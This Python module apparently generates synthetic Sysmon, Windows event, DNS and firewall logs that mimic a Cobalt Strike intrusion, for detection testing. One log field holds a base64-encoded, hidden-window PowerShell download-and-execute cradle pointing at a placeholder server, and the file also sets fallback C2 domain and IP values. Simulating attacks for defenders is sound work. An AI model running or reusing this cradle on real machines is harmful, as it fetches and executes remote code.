from __future__ import annotations

from datetime import datetime

from ..formatters.json_fmt import JSONFormatter
from ..formatters.syslog_fmt import CiscoASAFormatter
from ..formatters.sysmon_fmt import SysmonFormatter
from ..formatters.wineventlog_fmt import WinEventLogFormatter
from ..topology import Topology
from .base import BaseCampaign

BEACON_HASHES = [
    "b2f984ec684c3da37d8cada2cd0443ea01adee4f09a13891a7c847a36b90e4d0",
    "e8d60e79b57a48c9b5a53e67c837a7c5d7168fe3d1ecf38d94e30edab4a219f1",
    "4c1af7e0e3e5dbfe74fc62fa5ed2f3cc20e3b5e4d7e1c8a8b6d9423faabc9d12",
]

SYSMON_PID = 2084
SYSMON_TID = 3912


class CobaltStrikeCampaign(BaseCampaign):
    def __init__(self, topology: Topology) -> None:
        super().__init__(topology)
        self.sysmon_fmt = SysmonFormatter()
        self.winevent_fmt = WinEventLogFormatter()
        self.asa_fmt = CiscoASAFormatter()
        self.json_fmt = JSONFormatter()
        self._victim_host = topology.random_windows_host()
        self._sysmon_record_id = self.rng.randint(400000, 499999)
        self._winevent_record_number = self.rng.randint(500000, 599999)
        self._pipe_name = f"\\\\.\\pipe\\msagent_{self.rng.randint(10, 99)}"

    def _next_sysmon_record(self) -> int:
        self._sysmon_record_id += 1
        return self._sysmon_record_id

    def _next_winevent_record(self) -> int:
        self._winevent_record_number += 1
        return self._winevent_record_number

    @property
    def total_phases(self) -> int:
        return 4

    def _pick_c2_domain(self):
        return self.rng.choice(self.topo.cobaltstrike_domains) if self.topo.cobaltstrike_domains else "cdn-update.azureedge.info"

    def _pick_c2_ip(self):
        return self.rng.choice(self.topo.cobaltstrike_ips) if self.topo.cobaltstrike_ips else "91.215.85.142"

    def generate(self, ts: datetime) -> dict[str, list[str]]:
        phase = self.advance_phase()
        host = self._victim_host
        computer = self.topo.fqdn(host.hostname)

        if phase == 0:
            return self._powershell_cradle(ts, host, computer)
        elif phase == 1:
            return self._beacon_install(ts, host, computer)
        elif phase == 2:
            return self._lateral_movement(ts, host, computer)
        else:
            return self._c2_callback(ts, host, computer)

    def _powershell_cradle(self, ts, host, computer):
        ts_str = ts.strftime("%Y-%m-%dT%H:%M:%S.%f") + "Z"
        c2_domain = self._pick_c2_domain()
        c2_ip = self._pick_c2_ip()
        user = self.topo.random_user()

        ps_pid = self.topo.random_process_id()
        cradle_cmd = f"powershell.exe -nop -w hidden -encodedcommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwB7c2VydmVyfS8AYQAnACkA"

        sysmon_lines = [
            self.sysmon_fmt.format(ts, event_id=1, computer=computer, task=1,
                record_id=self._next_sysmon_record(), sysmon_pid=SYSMON_PID, sysmon_tid=SYSMON_TID,
                data_fields=[
                    ("RuleName", "technique_id=T1059.001,technique_name=PowerShell"),
                    ("UtcTime", ts_str),
                    ("ProcessGuid", self.topo.random_guid()),
                    ("ProcessId", str(ps_pid)),
                    ("Image", r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"),
                    ("CommandLine", cradle_cmd),
                    ("CurrentDirectory", f"C:\\Users\\{user.username}\\"),
                    ("User", f"{host.domain}\\{user.username}"),
                    ("LogonGuid", self.topo.random_guid()),
                    ("LogonId", self.topo.random_logon_id()),
                    ("IntegrityLevel", "High"),
                    ("Hashes", f"SHA256={self.rng.choice(BEACON_HASHES)}"),
                    ("ParentProcessGuid", self.topo.random_guid()),
                    ("ParentProcessId", str(self.topo.random_process_id())),
                    ("ParentImage", r"C:\Windows\explorer.exe"),
                    ("ParentCommandLine", r"C:\Windows\Explorer.EXE"),
                ]),
        ]

        dns_data = {
            "host_addr": [c2_ip],
            "message_type": ["QUERY", "RESPONSE"],
            "name": [c2_domain],
            "query": [c2_domain],
            "query_type": ["A"],
            "reply_code": "NoError",
            "reply_code_id": 0,
            "response_time": self.rng.randint(5000, 20000),
            "transaction_id": self.rng.randint(1000, 65535),
            "ttl": [60],
            "bytes": self.rng.randint(80, 200),
            "src_ip": host.ip,
            "src_port": self.topo.random_ephemeral_port(),
            "bytes_in": 40,
            "dest_ip": self.topo.dns_server_ip,
            "dest_port": 53,
            "bytes_out": self.rng.randint(60, 150),
            "time_taken": self.rng.randint(5000, 20000),
            "transport": "udp",
            "flow_id": self.topo.random_guid(),
            "protocol_stack": "ip:udp:dns",
        }
        dns_line = self.json_fmt.format(ts, data=dns_data)

        fw = self.topo.random_firewall()
        asa_line = self.asa_fmt.format(
            ts, hostname=fw.hostname, severity=6, message_id="302013",
            message=(
                f"Built outbound TCP connection {fw.next_conn_id()} for inside:{host.ip}/{self.topo.random_ephemeral_port()} "
                f"({host.ip}/{self.topo.random_ephemeral_port()}) to outside:{c2_ip}/443 ({c2_ip}/443)"
            ),
        )

        return {"sysmon": sysmon_lines, "stream:dns": [dns_line], "cisco:asa": [asa_line]}

    def _beacon_install(self, ts, host, computer):
        ts_str = ts.strftime("%Y-%m-%dT%H:%M:%S.%f") + "Z"
        beacon_hash = self.rng.choice(BEACON_HASHES)

        sysmon_lines = [
            self.sysmon_fmt.format(ts, event_id=1, computer=computer, task=1,
                record_id=self._next_sysmon_record(), sysmon_pid=SYSMON_PID, sysmon_tid=SYSMON_TID,
                data_fields=[
                    ("RuleName", "technique_id=T1055.012,technique_name=Process Hollowing"),
                    ("UtcTime", ts_str),
                    ("ProcessGuid", self.topo.random_guid()),
                    ("ProcessId", str(self.topo.random_process_id())),
                    ("Image", r"C:\Windows\System32\rundll32.exe"),
                    ("CommandLine", r"C:\Windows\System32\rundll32.exe"),
                    ("CurrentDirectory", r"C:\Windows\System32\\"),
                    ("User", r"NT AUTHORITY\SYSTEM"),
                    ("LogonGuid", self.topo.random_guid()),
                    ("LogonId", "0x3E7"),
                    ("IntegrityLevel", "System"),
                    ("Hashes", f"SHA256={beacon_hash}"),
                    ("ParentProcessGuid", self.topo.random_guid()),
                    ("ParentProcessId", str(self.topo.random_process_id())),
                    ("ParentImage", r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"),
                    ("ParentCommandLine", "powershell.exe -nop -w hidden"),
                ]),
            self.sysmon_fmt.format(ts, event_id=17, computer=computer, task=17,
                record_id=self._next_sysmon_record(), sysmon_pid=SYSMON_PID, sysmon_tid=SYSMON_TID,
                data_fields=[
                    ("RuleName", "technique_id=T1055.012,technique_name=Process Hollowing"),
                    ("EventType", "CreatePipe"),
                    ("UtcTime", ts_str),
                    ("ProcessGuid", self.topo.random_guid()),
                    ("ProcessId", str(self.topo.random_process_id())),
                    ("PipeName", self._pipe_name),
                    ("Image", r"C:\Windows\System32\rundll32.exe"),
                ]),
        ]

        win_line = self.winevent_fmt.format(
            ts, event_code=4688, computer=computer,
            task_category="Process Creation", keywords="Audit Success",
            record_number=self._next_winevent_record(),
            message=(
                "A new process has been created.\n"
                "\n"
                "Creator Subject:\n"
                "\tSecurity ID:\t\tS-1-5-18\n"
                "\tAccount Name:\t\tSYSTEM\n"
                "\tAccount Domain:\t\tNT AUTHORITY\n"
                "\tLogon ID:\t\t0x3E7\n"
                "\n"
                "Process Information:\n"
                f"\tNew Process ID:\t\t0x{self.topo.random_process_id():X}\n"
                "\tNew Process Name:\tC:\\Windows\\System32\\rundll32.exe\n"
                "\tToken Elevation Type:\t%%1936\n"
                "\tMandatory Label:\tS-1-16-16384\n"
                f"\tCreator Process ID:\t0x{self.topo.random_process_id():X}\n"
                "\tCreator Process Name:\tC:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n"
                "\tProcess Command Line:\tC:\\Windows\\System32\\rundll32.exe"
            ),
        )

        return {"sysmon": sysmon_lines, "wineventlog": [win_line]}

    def _lateral_movement(self, ts, host, computer):
        ts_str = ts.strftime("%Y-%m-%dT%H:%M:%S.%f") + "Z"
        lateral_target = self.topo.random_windows_host()
        target_computer = self.topo.fqdn(lateral_target.hostname)

        sysmon_line = self.sysmon_fmt.format(ts, event_id=3, computer=computer, task=3,
            record_id=self._next_sysmon_record(), sysmon_pid=SYSMON_PID, sysmon_tid=SYSMON_TID,
            data_fields=[
                ("RuleName", "technique_id=T1021.006,technique_name=Windows Remote Management"),
                ("UtcTime", ts_str),
                ("ProcessGuid", self.topo.random_guid()),
                ("ProcessId", str(self.topo.random_process_id())),
                ("Image", r"C:\Windows\System32\rundll32.exe"),
                ("User", r"NT AUTHORITY\SYSTEM"),
                ("Protocol", "tcp"),
                ("Initiated", "true"),
                ("SourceIp", host.ip),
                ("SourceHostname", computer),
                ("SourcePort", str(self.topo.random_ephemeral_port())),
                ("DestinationIp", lateral_target.ip),
                ("DestinationHostname", target_computer),
                ("DestinationPort", "5985"),
            ])

        win_line = self.winevent_fmt.format(
            ts, event_code=4624, computer=target_computer,
            task_category="Logon", keywords="Audit Success",
            record_number=self._next_winevent_record(),
            message=(
                "An account was successfully logged on.\n"
                "\n"
                "Logon Type:\t\t3\n"
                "\n"
                "New Logon:\n"
                "\tSecurity ID:\t\tS-1-5-18\n"
                "\tAccount Name:\t\tSYSTEM\n"
                "\tAccount Domain:\t\tNT AUTHORITY\n"
                f"\tLogon ID:\t\t{self.topo.random_logon_id()}\n"
                "\n"
                "Network Information:\n"
                f"\tWorkstation Name:\t{host.hostname}\n"
                f"\tSource Network Address:\t{host.ip}\n"
                "\tSource Port:\t\t5985\n"
                "\n"
                "Logon Process:\t\tNtLmSsp\n"
                "Authentication Package:\tNTLM"
            ),
        )

        return {"sysmon": [sysmon_line], "wineventlog": [win_line]}

    def _c2_callback(self, ts, host, computer):
        c2_domain = self._pick_c2_domain()
        c2_ip = self._pick_c2_ip()
        ts_str = ts.strftime("%Y-%m-%dT%H:%M:%S.%f") + "Z"
        jitter_ms = self.rng.randint(100, 3000)

        sysmon_line = self.sysmon_fmt.format(ts, event_id=3, computer=computer, task=3,
            record_id=self._next_sysmon_record(), sysmon_pid=SYSMON_PID, sysmon_tid=SYSMON_TID,
            data_fields=[
                ("RuleName", "technique_id=T1071.001,technique_name=Web Protocols"),
                ("UtcTime", ts_str),
                ("ProcessGuid", self.topo.random_guid()),
                ("ProcessId", str(self.topo.random_process_id())),
                ("Image", r"C:\Windows\System32\rundll32.exe"),
                ("User", r"NT AUTHORITY\SYSTEM"),
                ("Protocol", "tcp"),
                ("Initiated", "true"),
                ("SourceIp", host.ip),
                ("SourceHostname", computer),
                ("SourcePort", str(self.topo.random_ephemeral_port())),
                ("DestinationIp", c2_ip),
                ("DestinationHostname", c2_domain),
                ("DestinationPort", "443"),
            ])

        dns_data = {
            "host_addr": [c2_ip],
            "message_type": ["QUERY", "RESPONSE"],
            "name": [c2_domain],
            "query": [c2_domain],
            "query_type": ["A"],
            "reply_code": "NoError",
            "reply_code_id": 0,
            "response_time": jitter_ms,
            "transaction_id": self.rng.randint(1000, 65535),
            "ttl": [60],
            "bytes": self.rng.randint(60, 150),
            "src_ip": host.ip,
            "src_port": self.topo.random_ephemeral_port(),
            "bytes_in": 33,
            "dest_ip": self.topo.dns_server_ip,
            "dest_port": 53,
            "bytes_out": self.rng.randint(60, 120),
            "time_taken": jitter_ms,
            "transport": "udp",
            "flow_id": self.topo.random_guid(),
            "protocol_stack": "ip:udp:dns",
        }
        dns_line = self.json_fmt.format(ts, data=dns_data)

        fw = self.topo.random_firewall()
        asa_line = self.asa_fmt.format(
            ts, hostname=fw.hostname, severity=6, message_id="302013",
            message=(
                f"Built outbound TCP connection {fw.next_conn_id()} for inside:{host.ip}/{self.topo.random_ephemeral_port()} "
                f"({host.ip}/{self.topo.random_ephemeral_port()}) to outside:{c2_ip}/443 ({c2_ip}/443)"
            ),
        )

        return {"sysmon": [sysmon_line], "stream:dns": [dns_line], "cisco:asa": [asa_line]}
